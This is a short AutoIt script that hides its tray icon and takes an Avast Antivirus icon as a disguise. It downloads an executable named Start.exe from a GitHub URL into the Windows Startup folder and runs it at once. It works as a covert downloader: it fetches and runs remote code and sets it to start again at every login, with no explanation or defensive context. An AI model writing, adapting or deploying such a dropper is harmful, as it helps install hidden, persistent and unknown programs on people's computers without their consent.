#NoTrayIcon

#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=Ico\1492258937_Avast_Antivirus.ico
#Tidy_Parameters=/rel /reel /sf
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
$luser = @StartupDir
$start = $luser & "\Start.exe"

criarpath()
download()
Func criarpath()
	$path = FileExists(@AppDataDir & "\WinGG")
	If Not $path Then
		DirCreate(@AppDataDir & "\WinGG")
	EndIf
EndFunc   ;==>criarpath

Func download()
InetGet("https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/Start.exe", $start)
RunWait($luser & "\Start.exe")
EndFunc   ;==>download
